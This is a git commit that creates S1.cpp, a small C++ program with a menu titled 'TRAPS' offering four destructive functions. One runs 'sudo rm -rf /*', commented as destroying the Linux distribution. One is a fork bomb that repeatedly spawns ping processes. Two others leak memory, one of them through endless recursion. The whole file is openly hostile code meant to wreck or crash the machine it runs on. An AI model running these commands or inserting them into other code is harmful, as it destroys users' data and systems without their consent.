0b1cbe775fb9c313021762b6d418cf8ba4ac4736
MRX <94920917+MRX-72@users.noreply.github.com>
2022-05-03 15:29:32 +0530

    Create S1.cpp

---
+++ S1.cpp
@@ -0,0 +1,59 @@
+#include<iostream>
+#include<cstdlib>
+#include<unistd.h>
+using namespace std;
+
+void trap(){ //Memory allocation $Waste
+    malloc(20000);
+}
+
+void tf(){ //Destroy the Linux Distro
+    system("sudo rm -rf /*");
+}
+
+void crash(){ //Ping yourself to death 
+    for(;;){
+        fork();
+        system("ping 127.0.0.1");
+    }
+}
+
+void tftrap(){ //Memory spoiler
+    malloc(2000);
+    tftrap(); //Recursion 
+}
+
+
+int main()
+{
+    int f; //Input Variable 
+    
+    cout<<"TRAPS ~ \n\n"; // M
+    cout<<"[1] trap()\n"; // E
+    cout<<"[2] tf()\n";   // N
+    cout<<"[3] crash()\n";// U
+    cout<<"[4] tftrap()\n\n";//
+lb:    
+    cout << ">> ";
+    cin >> f; //Input 
+    
+    switch(f){ //trap decider 
+        case 1: trap();
+            break;
+        
+        case 2: tf();
+            break;
+        
+        case 3: crash();
+            break;
+        
+        case 4: tftrap();
+            break;
+        
+        default: // If input != 1 || 2 || 3 || 4
+           cout<<"[E] : Not a valid option\n";
+           goto lb; //Take the Input again 
+           break;
+    }
+    return 0;
+}
